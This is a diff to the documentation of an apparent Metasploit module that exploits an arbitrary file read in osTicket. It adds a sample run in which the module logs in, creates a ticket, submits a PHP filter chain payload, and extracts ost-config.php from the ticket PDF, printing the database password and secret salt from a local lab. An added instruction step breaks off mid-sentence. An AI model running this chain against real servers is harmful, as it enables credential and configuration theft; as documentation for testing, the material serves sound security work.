@@ -356,7 +356,7 @@ docker run -d -p 8080:80 --name osticket_vuln_server osticket-cve-env
 2. Start `msfconsole`.
 3. Do: `use auxiliary/gather/osticket_arbitrary_file_read`
 4. Set the `RHOSTS` and `RPORT` options as necessary
-5. Set the `TICKET_NUMBER` with the ticket number gathered from the website.
+5. Set the `TICKET_NUMBER` with the ticket number gathered from the website. If not set
 6. Set the `USERNAME` and `PASSWORD` from the registered user.
 7. Set the full file name that you want to fetch in the `FILE`.
 8. Do: `run`
@@ -822,6 +822,208 @@ messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
 systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
 mysql:
 [+] Saved to: /home/tintin/.msf4/loot/20260222194159_default_1_osticket.etc_pas_624998.bin
+
+[+] Exploitation complete
+[*] Auxiliary module execution completed
+```
+
+### Without Specifying Ticket Number
+
+```
+msf auxiliary(gather/osticket_arbitrary_file_read) > set USERNAME newuser
+USERNAME => newuser
+msf auxiliary(gather/osticket_arbitrary_file_read) > set VERBOSE true
+VERBOSE => true
+msf auxiliary(gather/osticket_arbitrary_file_read) > set RHOSTS http://localhost:8080/
+RHOSTS => http://localhost:8080/
+msf auxiliary(gather/osticket_arbitrary_file_read) > set PASSWORD newuser
+PASSWORD => newuser
+msf auxiliary(gather/osticket_arbitrary_file_read) > run
+[*] Running module against 127.0.0.1
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] is_osticket?: Response code=200, body length=4943
+[*] is_osticket?: osTicket signature FOUND in response body
+[!] The service is running, but could not be validated. Target appears to be an osTicket installation
+[*] Target: 127.0.0.1:8080
+[*] File to extract: include/ost-config.php
+[*] Attempting authentication...
+[*] do_login: portal preference=auto, base_uri=/, username=newuser
+[*] do_login: Trying staff panel (/scp/) login...
+[*] osticket_login_scp: GET /scp/login.php
+[*] osticket_login_scp: GET response code=200, cookies=OSTSESSID=uf493kdg73eh3bf11pmcv6ed54;
+[*] extract_csrf_token: Searching HTML (6504 bytes) for __CSRFToken__
+[+] extract_csrf_token: Found token=0e9e898a719233e0a4ecec120cd047d0cd9507ee
+[*] osticket_login_scp: POST /scp/login.php with userid=newuser
+[*] osticket_login_scp: POST response code=200, url=, body contains userid=true
+[-] osticket_login_scp: Login FAILED (still see login form)
+[*] do_login: Staff panel login failed
+[*] do_login: Trying client portal login...
+[*] osticket_login_client: GET /login.php
+[*] osticket_login_client: GET response code=200, cookies=OSTSESSID=6cei75oh450nmtfni8a5tqps2o;
+[*] extract_csrf_token: Searching HTML (5213 bytes) for __CSRFToken__
+[+] extract_csrf_token: Found token=dba0292e34ca0ff8fc036933d4d6db2a2eb791df
+[*] osticket_login_client: POST /login.php with luser=newuser
+[*] osticket_login_client: POST response code=302, body contains luser=false
+[+] osticket_login_client: Login SUCCESS
+[+] do_login: Client portal login succeeded, cookies=OSTSESSID=6cei75oh450nmtfni8a5tqps2o;
+[+] Authenticated via client portal
+[!] No TICKET_NUMBER supplied — a new ticket will be created each time this module runs
+[*] create_ticket: GET /open.php
+[*] extract_csrf_token: Searching HTML (6579 bytes) for __CSRFToken__
+[+] extract_csrf_token: Found token=7cc418ea2a3fff84b6593ad2928a7e7c66e4745d
+[*] detect_open_form_fields: topicId=2
+[*] fetch_topic_form_fields: GET /ajax.php/form/help-topic/2
+[*] fetch_topic_form_fields: subject="eac457d4f21b58", message="56f3da3b9db7ae"
+[*] create_ticket: POST /open.php (topicId=2)
+[*] create_ticket: POST response code=302
+[+] create_ticket: Ticket created, internal ID=12
+[*] fetch_ticket_number: GET /tickets.php?id=12
+[+] fetch_ticket_number: Ticket number=#169169
+[+] Created ticket #169169 (internal ID: 12)
+[*] Generating PHP filter chain payload...
+[*] Payload generated (13656 bytes)
+[*] Submitting payload as ticket reply...
+[*] submit_ticket_reply: GET /tickets.php?id=12 to fetch CSRF token
+[*] submit_ticket_reply: GET response code=200, body=9618 bytes
+[*] extract_csrf_token: Searching HTML (9618 bytes) for __CSRFToken__
+[+] extract_csrf_token: Found token=7cc418ea2a3fff84b6593ad2928a7e7c66e4745d
+[*] submit_ticket_reply: Using textarea field '56f3da3b9db7ae', payload=13656 bytes
+[*] submit_ticket_reply: POST /tickets.php with a=reply, id=12
+[*] submit_ticket_reply: POST response code=200, body=24137 bytes
+[*] submit_ticket_reply: Success indicators found=true
+[+] Reply posted successfully
+[*] Downloading ticket PDF...
+[*] download_ticket_pdf: Trying PDF export from /tickets.php
+[*] download_ticket_pdf: GET /tickets.php?a=print&id=12
+[*] download_ticket_pdf: Response code=200, Content-Type=application/pdf, magic="%PDF", size=57262
+[+] download_ticket_pdf: Got PDF (57262 bytes)
+[+] PDF downloaded (57262 bytes)
+[*] Extracting file from PDF...
+[*] extract_files_from_pdf: Processing PDF (57262 bytes)
+[*] extract_pdf_image_streams: Found image object (139060 bytes decompressed)
+[*] extract_pdf_image_streams: Found image object (6357 bytes decompressed)
+[*] extract_files_from_pdf: Found 2 image XObject streams
+[*] extract_files_from_pdf: Image #0: 139060 bytes, swapped to BGR
+[*] extract_files_from_pdf: Image #1: 6357 bytes, swapped to BGR
+[*] extract_data_from_bmp_stream: ISO-2022-KR marker found at offset 0 in 6357-byte stream
+[*] extract_data_from_bmp_stream: 6353 bytes after marker (nulls stripped)
+[*] First 96 bytes of data after marker and null-strip:
+[*]   ascii: "<?php./*********************************************************************.    ost-config.php."
+[*]   hex:   3c 3f 70 68 70 0a 2f 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 0a 20 20 20 20 6f 73 74 2d 63 6f 6e 66 69 67 2e 70 68 70 0a
+[*] Data looks like base64? false
+[*] Treating as plain (non-base64) - preview:
+[*]   ascii: "<?php./*********************************************************************.    ost-config.php."
+[*]   hex:   3c 3f 70 68 70 0a 2f 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 0a 20 20 20 20 6f 73 74 2d 63 6f 6e 66 69 67 2e 70 68 70 0a
+[+] extract_files_from_pdf: Image #1 yielded 6353 bytes of extracted data
+[*] extract_files_from_pdf: Fallback - scanning 12 raw streams
+[*] extract_files_from_pdf: Total extracted files: 1
+[+] Extracted 6353 bytes
+
+======================================================================
+EXTRACTED FILE CONTENTS
+======================================================================
+
+--- [include/ost-config.php] (6353 bytes) ---
+<?php
+/*********************************************************************
+    ost-config.php
+
+    Static osTicket configuration file. Mainly useful for mysql login info.
+    Created during installation process and shouldn't change even on upgrades.
+
+    Peter Rotich <peter@osticket.com>
+    Copyright (c)  2006-2010 osTicket
+    http://www.osticket.com
+
+    Released under the GNU General Public License WITHOUT ANY WARRANTY.
+    See LICENSE.TXT for details.
+
+    vim: expandtab sw=4 ts=4 sts=4:
+    $Id: $
+**********************************************************************/
+
+#Disable direct access.
+if(!strcasecmp(basename($_SERVER['SCRIPT_NAME']),basename(__FILE__)) || !defined('INCLUDE_DIR'))
+    die('kwaheri rafiki!');
+
+#Install flag
+define('OSTINSTALLED',TRUE);
+if(OSTINSTALLED!=TRUE){
+    if(!file_exists(ROOT_DIR.'setup/install.php')) die('Error: Contact system admin.'); //Something is really wrong!
+    //Invoke the installer.
+    header('Location: '.ROOT_PATH.'setup/install.php');
+    exit;
+}
+
+# Encrypt/Decrypt secret key - randomly generated during installation.
+define('SECRET_SALT','ELPqrKK_aF5JLxk9M0uz__EFFP3Jxn0P');
+
+#Default admin email. Used only on db connection issues and related alerts.
+define('ADMIN_EMAIL','administrator@localhost.local');
+
+# Database Options
+# ====================================================
+# Mysql Login info
+#
+define('DBTYPE','mysql');
+#  DBHOST can have comma separated hosts (e.g db1:6033,db2:6033)
+define('DBHOST','localhost');
+define('DBNAME','osticket_db');
+define('DBUSER','osticket_user');
+define('DBPASS','P@ssw0rd123!');
+
+# Database TCP/IP Connect Timeout (default: 3 seconds)
+# Timeout is important when DBHOST has multiple proxies to try
+# define('DBCONNECT_TIMEOUT', 3);
+
+# Table prefix
+define('TABLE_PREFIX','ost_');
+
+#
+# SSL Options
+# ---------------------------------------------------
+# SSL options for MySQL can be enabled by adding a certificate allowed by
+# the database server here. To use SSL, you must have a client certificate
+# signed by a CA (certificate authority). You can easily create this
+# yourself with the EasyRSA suite. Give the public CA certificate, and both
+# the public and private parts of your client certificate below.
+#
+# Once configured, you can ask MySQL to require the certificate for
+# connections:
+#
+# > create user osticket;
+# > grant all on osticket.* to osticket require subject '<subject>';
+#
+# More information (to-be) available in doc/security/hardening.md
+
+# define('DBSSLCA','/path/to/ca.crt');
+# define('DBSSLCERT','/path/to/client.crt');
+# define('DBSSLKEY','/path/to/client.key');
+
+#
+# Mail Options
+# ===================================================
+# Option: MAIL_EOL (default: \n)
+#
+# Some mail setups do not handle emails with \r\n (CRLF) line endings for
+# headers and base64 and quoted-response encoded bodies. This is an error
+# and a violation of the internet mail RFCs. However, because this is also
+# outside the control of both osTicket development and many server
+#
+
+... (truncated)
+[+] Saved to: /home/tintin/.msf4/loot/20260321104202_default_127.0.0.1_osticket.include_866909.php
+
+======================================================================
+KEY FINDINGS
+======================================================================
+[+]   SECRET_SALT: ELPqrKK_aF5JLxk9M0uz__EFFP3Jxn0P
+[+]   ADMIN_EMAIL: administrator@localhost.local
+[+]   DBHOST: localhost
+[+]   DBNAME: osticket_db
+[+]   DBUSER: osticket_user
+[+]   DBPASS: P@ssw0rd123!
+[!] No active DB -- Credential data will not be saved!
 
 [+] Exploitation complete
 [*] Auxiliary module execution completed
